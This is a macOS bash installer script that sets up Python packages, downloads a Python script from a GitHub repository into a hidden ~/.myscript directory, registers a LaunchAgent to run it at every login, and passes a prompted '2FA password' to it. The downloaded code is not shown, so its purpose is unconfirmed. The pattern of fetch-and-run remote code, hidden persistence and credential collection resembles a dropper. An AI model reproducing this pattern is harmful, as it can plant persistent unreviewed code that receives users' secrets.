#im not doing that lol IYKYK
function create_myscript_directory() {
    echo "Creating .myscript directory..."
    mkdir -p "$HOME/.myscript"
}

function install_homebrew() {
    echo "Checking if Homebrew is installed..."
    if ! command -v brew &>/dev/null; then
        echo "Installing Homebrew..."
        HOMEBREW_INSTALL_URL="https://raw.githubusercontent.com/Homebrew/install/master/install.sh"
        HOMEBREW_INSTALL_SCRIPT="/tmp/homebrew_install.sh"
        curl -fsSL $HOMEBREW_INSTALL_URL -o $HOMEBREW_INSTALL_SCRIPT
        /bin/bash $HOMEBREW_INSTALL_SCRIPT || display_error "Failed to install Homebrew"
        echo; echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> "$HOME/.zprofile" || display_error "Failed to add brew to .zprofile"
        eval "$(/opt/homebrew/bin/brew shellenv)" || display_error "Failed to set up Homebrew environment"
    else
        echo "Homebrew is already installed."
    fi
}

function install_python_tkinter() {
    echo "Installing Python with Tkinter support..."
    brew install python-tk || display_error "Failed to install Python with Tkinter support"
}

function install_get_pip() {
    echo "Installing get-pip.py..."
    curl -fsSL https://bootstrap.pypa.io/get-pip.py -o /tmp/get-pip.py || display_error "Failed to download get-pip.py"
    /usr/local/bin/python3 /tmp/get-pip.py || display_error "Failed to install pip using get-pip.py"
    export PATH="/Library/Frameworks/Python.framework/Versions/3.11/bin:$PATH"
}

function install_python_packages() {
    echo "Installing PySimpleGUI and required packages..."

    /usr/local/bin/python3 -m pip install --upgrade pip || display_error "Failed to upgrade pip"
    /usr/local/bin/python3 -m pip install PySimpleGUI qrcode requests pyotp pillow keyring || display_error "Failed to install required Python packages"
}

function download_script() {
    echo "Downloading the Python script..."
    curl -o "$HOME/.myscript/new.py" https://raw.githubusercontent.com/alwayshyper/protec/main/main.py || display_error "Failed to download the Python script"
}

function create_shell_script() {
    echo "Creating the shell script..."
    cat << EOF > "$HOME/.myscript/run_new_script.sh"
#!/bin/bash

# Change to the directory where your Python script is located
cd "$HOME/.myscript/"

# Replace python3 with the correct Python version if needed
/usr/local/bin/python3 new.py
EOF

    chmod +x "$HOME/.myscript/run_new_script.sh"
}

function install_launch_agent() {
    echo "Creating a launch agent..."
    cat << EOF > "$HOME/Library/LaunchAgents/com.$USER.run_new_script.plist"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.$USER.run_new_script</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/python3</string>
        <string>/Users/$USER/.myscript/new.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
}

function load_launch_agent() {
    echo "Loading the launch agent..."
    launchctl load "$HOME/Library/LaunchAgents/com.$USER.run_new_script.plist" || display_error "Failed to load the launch agent"
}

function prompt_for_2fa() {
    echo "Please enter your 2FA password:"
    read -r password
    echo "$password"
}

function display_error() {
    echo "Error: $1"
    exit 1
}

function main() {
    create_myscript_directory
    install_homebrew
    install_python_tkinter
    install_get_pip
    install_python_packages
    download_script
    create_shell_script
    install_launch_agent
    load_launch_agent
    
    password=$(prompt_for_2fa)
    echo "Setting up 2FA..."
    python3 "$HOME/.myscript/new.py" setup_2fa "$password"
    
    echo "Setup completed successfully!"
}

# Tired af:/
main
